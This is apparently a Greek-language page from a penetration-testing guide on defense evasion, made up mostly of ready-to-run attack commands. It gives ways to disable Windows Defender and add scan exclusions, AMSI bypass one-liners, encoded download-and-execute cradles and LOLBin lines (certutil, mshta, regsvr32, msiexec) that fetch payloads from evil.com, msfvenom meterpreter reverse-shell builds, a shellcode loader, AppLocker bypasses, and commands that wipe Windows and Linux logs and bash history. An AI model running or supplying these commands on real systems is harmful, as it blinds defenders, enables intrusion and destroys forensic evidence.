# 🛡️ Φάση 6: Αποφυγή μηχανισμών άμυνας (Defense Evasion)

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../06-Defense-Evasion.md) • [🇮🇹 Italiano](06-Defense-Evasion.it.md) • [🇹🇷 Türkçe](06-Defense-Evasion.tr.md)

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Στόχος:** Μελέτη τεχνικών αποφυγής ελέγχων ασφαλείας, όπως προστασία από κακόβουλο λογισμικό, καταγραφή και κανόνες δικτύου.

---

## Πριν ξεκινήσετε

Η **αποφυγή μηχανισμών άμυνας** αφορά απόπειρες περιορισμού της ανίχνευσης ή της ορατότητας των ενεργειών. Η ενότητα παρουσιάζει παραδείγματα του αγγλικού πρωτοτύπου για κατανόηση και αξιολόγηση σε εργαστήριο· δεν τεκμηριώνει ότι λειτουργούν σε σύγχρονες εκδόσεις ή ότι εξασφαλίζουν μη ανίχνευση.

**Βασικοί όροι:** **AV (Antivirus)** είναι προστασία από κακόβουλο λογισμικό. **EDR** είναι τεχνολογία παρακολούθησης, ανίχνευσης και απόκρισης στις συσκευές. Το **AMSI** είναι διεπαφή που επιτρέπει σε εφαρμογές να υποβάλλουν περιεχόμενο για έλεγχο. Το **ETW** είναι υποδομή καταγραφής συμβάντων των Windows. Τα **logs** είναι καταγραφές ενεργειών και συμβάντων. **Obfuscation** σημαίνει μετασχηματισμό κώδικα ώστε να διαβάζεται δυσκολότερα· η κωδικοποίηση **Base64** δεν αποτελεί κρυπτογράφηση.

Τα **LOLBins** είναι διαθέσιμα εκτελέσιμα του συστήματος που μπορούν να χρησιμοποιηθούν και καταχρηστικά. Τα **AppLocker/WDAC** είναι μηχανισμοί πολιτικών εκτέλεσης εφαρμογών. Η απενεργοποίηση προστασίας ή η διαγραφή καταγραφών μειώνει την ασφάλεια και μπορεί να καταστρέψει αποδεικτικά στοιχεία.

## Περιεχόμενα

- [🛡️ Αποφυγή ελέγχων του Windows Defender](#section-01)
- [🔓 Παράκαμψη της διεπαφής ελέγχου κώδικα AMSI](#section-02)
- [📦 Απόκρυψη της μορφής του κώδικα (Payload Obfuscation)](#section-03)
- [🎭 Κατάχρηση διαθέσιμων εργαλείων του συστήματος (Living Off The Land / LOLBins)](#section-04)
- [🔒 Παρέμβαση στην καταγραφή συμβάντων (ETW / Logging)](#section-05)
- [🐧 Αποφυγή ανίχνευσης στο Linux](#section-06)
- [🛠️ Εργαλεία](#section-07)
- [📊 Γρήγορη αναφορά](#section-08)
- [🔗 Σχετικοί οδηγοί αναφοράς](#section-09)

<a id="section-01"></a>

## 🛡️ Αποφυγή ελέγχων του Windows Defender

### Απενεργοποίηση Windows Defender — απαιτούνται δικαιώματα διαχειριστή
```powershell
# Παράδειγμα απενεργοποίησης προστασίας σε πραγματικό χρόνο
Set-MpPreference -DisableRealtimeMonitoring $true

# Παραδείγματα απενεργοποίησης επιμέρους λειτουργιών Defender
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Προσθήκη εξαιρέσεων ελέγχου
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Μέσω μητρώου των Windows
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Έλεγχος κατάστασης του Defender
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

<a id="section-02"></a>

## 🔓 Παράκαμψη της διεπαφής ελέγχου κώδικα AMSI

### Παραδείγματα παράκαμψης AMSI μέσω PowerShell
```powershell
# Παράδειγμα 1 — πεδίο amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Παράδειγμα 2 — εντολή μίας γραμμής του Matt Graeber
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Παράδειγμα 3 — τροποποίηση μνήμης
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Παράδειγμα παράκαμψης AMSI με δυσανάγνωστο κώδικα

**Περιορισμός του πρωτοτύπου:** η συμβολοσειρά μορφοποίησης περιέχει το `{3}`, ενώ παρέχονται μόνο τρία ορίσματα. Το παράδειγμα διατηρείται για αντιστοιχία με την πηγή, με αυτή την εμφανή ασυμφωνία, και δεν παρουσιάζεται ως έτοιμη λειτουργική λύση.

```powershell
# Μετασχηματισμός συμβολοσειρών σε δυσανάγνωστη μορφή
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

<a id="section-03"></a>

## 📦 Απόκρυψη της μορφής του κώδικα (Payload Obfuscation)

### Δυσανάγνωστη διατύπωση κώδικα PowerShell (Obfuscation)
```powershell
# Κωδικοποίηση Base64
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Συνένωση συμβολοσειρών
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### Μετασχηματισμός εκτελέσιμων αρχείων (Binary Obfuscation)
```bash
# Κωδικοποίηση με msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# Παράδειγμα προσαρμοσμένου μετασχηματισμού XOR
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Κώδικας φόρτωσης εντολών μηχανής (Shellcode Loaders)

Το shellcode είναι εντολές μηχανής που εκτελούνται στη μνήμη. Το απόσπασμα χρησιμοποιεί ενδεικτικά δεδομένα με αποσιωπητικά και δεν αποτελεί πλήρες πρόγραμμα έτοιμο για μεταγλώττιση.

```c
// Απλό απόσπασμα φόρτωσης κώδικα μηχανής σε C
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

<a id="section-04"></a>

## 🎭 Κατάχρηση διαθέσιμων εργαλείων του συστήματος (Living Off The Land / LOLBins)

### Λήψη και εκτέλεση αρχείων
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### Εκτέλεση κώδικα μέσω εργαλείων συστήματος
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### Παραδείγματα παράκαμψης πολιτικών AppLocker/WDAC
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

<a id="section-05"></a>

## 🔒 Παρέμβαση στην καταγραφή συμβάντων (ETW / Logging)

### Παράδειγμα σχετικό με την καταγραφή ETW

**Διευκρίνιση του παραδείγματος:** ο παρακάτω κώδικας δηλώνει μια εξωτερική συνάρτηση και φορτώνει τον ορισμό της με `Add-Type`. Δεν την καλεί ούτε τροποποιεί τη μνήμη της· από μόνος του δεν απενεργοποιεί το ETW.

```powershell
# Δήλωση πρόσβασης στη συνάρτηση ETW — το απόσπασμα δεν την τροποποιεί
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### Διαγραφή καταγραφών συμβάντων

Η διαγραφή τοπικών καταγραφών δεν συνεπάγεται διαγραφή αντιγράφων που έχουν ήδη αποσταλεί σε άλλο σύστημα.

```powershell
# Παραδείγματα διαγραφής επιλεγμένων καταγραφών
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# Παράδειγμα αλλαγής πολιτικής ελέγχου συμβάντων
auditpol /clear /y
```

### Απενεργοποίηση καταγραφής PowerShell
```powershell
# Απενεργοποίηση καταγραφής τμημάτων σεναρίων PowerShell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Απενεργοποίηση καταγραφής μονάδων PowerShell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

<a id="section-06"></a>

## 🐧 Αποφυγή ανίχνευσης στο Linux

### Αλλαγή χρονικών σημάνσεων αρχείων (Timestomping)
```bash
# Αλλαγή χρονικών σημάνσεων αρχείου
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### Διαγραφή καταγραφών
```bash
# Διαγραφή ιστορικού bash
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Διαγραφή καταγραφών συστήματος
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### Απόκρυψη ή παραπλανητική ονομασία διεργασίας
```bash
# Αλλαγή της εμφανιζόμενης ονομασίας διεργασίας
exec -a "[kworker/0:0]" ./malicious

# Αναφορά σε απόκρυψη μέσω LD_PRELOAD
# Το πρωτότυπο αναφέρεται σε βιβλιοθήκη που παρεμβάλλεται στη readdir() για απόκρυψη εγγραφών
```

---

<a id="section-07"></a>

## 🛠️ Εργαλεία

| Εργαλείο | Σκοπός |
| ------ | --------- |
| **Invoke-Obfuscation** | Μετασχηματισμός κώδικα PowerShell σε δυσανάγνωστη μορφή |
| **Veil** | Δημιουργία κώδικα για σενάρια δοκιμών (Payloads) |
| **ScareCrow** | Δημιουργία payloads με στόχο την παράκαμψη EDR |
| **Donut** | Δημιουργία κώδικα μηχανής (Shellcode) |
| **Nimcrypt2** | Συσκευασία εκτελέσιμων αρχείων Windows (PE) |
| **PEzor** | Φόρτωση shellcode σε εκτελέσιμα Windows (PE) |

---

<a id="section-08"></a>

## 📊 Γρήγορη αναφορά

### Μηχανισμοί ανίχνευσης και σχετικές τεχνικές παράκαμψης

| Ανίχνευση | Τεχνική παράκαμψης |
| ----------- | ------------------ |
| Αναγνώριση γνωστών υπογραφών | Δυσανάγνωστη μορφή κώδικα και κωδικοποίηση |
| AMSI | Τροποποίηση μνήμης και σενάρια παράκαμψης |
| ETW | Τροποποίηση στοιχείων καταγραφής ETW |
| Καταγραφή συμβάντων | Απενεργοποίηση ή διαγραφή καταγραφών |
| AppLocker | Κατάχρηση εργαλείων συστήματος και επιτρεπόμενων διαδρομών |
| Ανάλυση συμπεριφοράς | Χρήση ήδη διαθέσιμων εργαλείων του συστήματος |

### Σύντομος κατάλογος εργαλείων LOLBins

| Εκτελέσιμο | Χρήση |
| -------- | ----- |
| certutil | Λήψη αρχείων |
| bitsadmin | Λήψη αρχείων |
| mshta | Εκτέλεση αρχείων HTA |
| rundll32 | Εκτέλεση DLL ή JavaScript |
| regsvr32 | Εκτέλεση αρχείων SCT |
| msbuild | Εκτέλεση έργων που περιγράφονται σε XML |
| installutil | Εκτέλεση κώδικα μέσα από σχετικό εκτελέσιμο |

---

<a id="section-09"></a>

## 🔗 Σχετικοί οδηγοί αναφοράς

- [PowerShell](../../PowerShell/translations/README.el.md)
- [Mimikatz](../../Mimikatz/translations/README.el.md)

---

**Προηγούμενη φάση:** [← 05 — Διατήρηση πρόσβασης](05-Persistence.el.md)

**Επόμενη φάση:** [07 — Ενέργειες για την επίτευξη στόχων →](07-Actions-Objectives.el.md)

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
